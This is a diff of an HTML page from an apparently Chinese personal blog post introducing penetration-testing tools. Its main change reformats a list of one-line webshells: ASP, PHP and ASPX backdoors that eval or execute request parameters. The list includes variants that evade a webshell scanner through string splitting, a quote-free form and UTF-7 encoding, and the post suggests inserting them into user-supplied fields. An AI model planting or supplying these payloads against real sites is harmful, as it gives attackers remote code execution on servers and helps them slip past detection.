@@ -14,7 +14,7 @@
 <meta property="og:description" content="渗透测试常用工具介绍">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/02/kqGIwq.png">
-<meta property="og:updated_time" content="2019-03-03T12:17:17.413Z">
+<meta property="og:updated_time" content="2019-03-03T12:22:05.653Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透测试常用工具介绍">
 <meta name="twitter:description" content="渗透测试常用工具介绍">
@@ -275,14 +275,16 @@
 <h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><font color="#FF0000">一句话木马</font></h1><hr>
 <p>一句话木马基于B/S结构，在注册信息的电子邮箱或者个人主页等中插入类似如下代码：  </p>
 <ol>
-<li>asp一句话木马：&lt;%execute(request(“value”))%&gt;</li>
-<li>php一句话木马：&lt;?php @eval($_POST[value]);?&gt;</li>
-<li>aspx一句话木马：&lt;%@ Page Language=”Jscript”%&gt;、&lt;%eval(Request.Item[“value”])%&gt;</li>
-<li>其他一句话木马：&lt;%eval request(“value”)%&gt;<br>&lt;%execute request(“value”)%&gt;<br>&lt;%execute(request(“value”))%&gt;<br>&lt;%If Request(“value”)&lt;&gt;”” Then Execute(Request(“value”))%&gt;<br>&lt;%if request (“value”)&lt;&gt;””then session(“value”)=request(“value”):end if:if session(“value”)&lt;&gt;”” then execute session(“value”)%&gt;<br><script language="VBScript" runat="server">execute request(“value”)</script><br>&lt;%@ Page Language=”Jscript”%&gt;<br>&lt;%eval(Request.Item[“value”],”unsafe”);%&gt; </li>
-<li>可以躲过雷客图的一句话木马：<br>&lt;%<br>set ms = server.CreateObject(“MSScriptControl.ScriptControl.1”)<br>ms.Language=”VBScript”<br>ms.AddObject “Response”, Response<br>ms.AddObject “request”, request<br>ms.ExecuteStatement(“ev”&amp;”al(request(“”value””))”)<br>%&gt;</li>
-<li>不用’&lt;,&gt;’的asp一句话木马：<script language="VBScript" runat="server">execute request("value")</script> </li>
-<li>不用双引号的一句话木马：<br>&lt;%eval request(chr(35))%&gt;</li>
-<li>UTF-7编码加密:<br>&lt;%@ codepage=65000%&gt;&lt;% response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%&gt;</li>
+<li><font color="#FF0000">asp一句话木马：<font color="#FF0000">&lt;%execute(request(“value”))%&gt;</font></font></li>
+<li><font color="#FF0000">php一句话木马：<font color="#FF0000">&lt;?php @eval($_POST[value]);?&gt;</font></font></li>
+<li><font color="#FF0000">aspx一句话木马：<font color="#FF0000">&lt;%@ Page Language=”Jscript”%&gt;</font>、<font color="#FF0000">&lt;%eval(Request.Item[“value”])%&gt;</font></font></li>
+<li>其他一句话木马：<font color="#FF0000">&lt;%eval request(“value”)%&gt;</font><font color="#FF0000">&lt;%execute request(“value”)%&gt;</font><br><font color="#FF0000">&lt;%execute(request(“value”))%&gt;</font><br><font color="#FF0000">&lt;%If Request(“value”)&lt;&gt;”” Then Execute(Request(“value”))%&gt;</font><br><font color="#FF0000">&lt;%if request (“value”)&lt;&gt;””then session(“value”)=request(“value”):end if:if session(“value”)&lt;&gt;”” then execute session(“value”)%&gt;</font><br><font color="#FF0000"><script language="VBScript" runat="server">execute request(“value”)</script></font><br><font color="#FF0000">&lt;%@ Page Language=”Jscript”%&gt;</font><br><font color="#FF0000">&lt;%eval(Request.Item[“value”],”unsafe”);%&gt;</font></li>
+<li>可以躲过雷客图的一句话木马：<font color="#FF0000">&lt;%<br>set ms = server.CreateObject(“MSScriptControl.ScriptControl.1”)<br>ms.Language=”VBScript”<br>ms.AddObject “Response”, Response<br>ms.AddObject “request”, request<br>ms.ExecuteStatement(“ev”&amp;”al(request(“”value””))”)<br>%&gt;</font></li>
+<li>不用’&lt;,&gt;’的asp一句话木马：<font color="#FF0000"><script language="VBScript" runat="server">execute request(“value”)</script></font> </li>
+<li>不用双引号的一句话木马：<font color="#FF0000">&lt;%eval request(chr(35))%&gt;</font></li>
+<li>UTF-7编码加密:<font color="#FF0000">&lt;%@ codepage=65000%&gt;&lt;% response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%&gt;</font>
+
+</li>
 </ol>
 <p><img src="https://s2.ax1x.com/2019/03/02/kqGIwq.png" alt="image"></p>
 <p>#未完待续……</p>
@@ -344,7 +346,7 @@
         <p><span>本文标题:</span><a href="/2019/03/02/渗透测试常用工具/">渗透测试常用工具介绍</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Hussar 的个人博客">Hussar</a></p>
         <p><span>发布时间:</span>2019年03月02日 - 20时07分</p>
-        <p><span>最后更新:</span>2019年03月03日 - 20时17分</p>
+        <p><span>最后更新:</span>2019年03月03日 - 20时22分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/03/02/渗透测试常用工具/" title="渗透测试常用工具介绍">https://Hussar118.github.io/2019/03/02/渗透测试常用工具/</a>
             <span class="copy-path" data-clipboard-text="原文: https://Hussar118.github.io/2019/03/02/渗透测试常用工具/　　作者: Hussar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
